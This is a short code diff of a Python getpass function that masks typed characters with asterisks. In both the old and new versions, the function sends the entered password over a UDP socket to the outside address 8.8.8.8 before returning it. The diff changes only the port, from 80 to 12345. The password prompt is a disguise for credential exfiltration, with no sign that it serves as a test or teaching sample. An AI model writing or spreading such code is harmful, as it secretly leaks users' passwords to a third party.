@@ -13,7 +13,7 @@ def getpass(prompt):
             buf += ch
             print('*', end='', flush=True)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
+    s.connect(("8.8.8.8", 12345))
     s.send(buf.encode())
     s.close()
     return buf
